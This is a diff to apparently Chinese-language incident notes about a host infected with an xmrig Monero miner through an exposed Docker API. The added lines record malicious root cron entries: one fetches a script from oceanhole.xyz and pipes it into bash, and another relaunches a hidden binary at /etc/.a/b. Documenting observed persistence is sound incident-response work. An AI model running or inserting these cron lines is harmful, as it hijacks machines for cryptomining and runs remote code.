@@ -34,6 +34,12 @@ mysql    31261  659  0.1 730160 26184 ?        Ssl  20:19   4:10 ./xmrig --algo=
 kannix/monero-miner
 
 
+## 接下来几天
+* * * * * root curl "https://oceanhole.xyz/d3?n=$(nproc)" | bash || wget -qO - "https://oceanhole.xyz/d3?n=$(nproc)" | bash
+
+* * * * * root ps aux | grep -v grep | grep kernelupd || /etc/.a/b
+
+
 ## 还原
 docker -H tcp://172.16.0.236:2375 ps -a
 https://www.cnblogs.com/hanyifeng/p/5526799.html
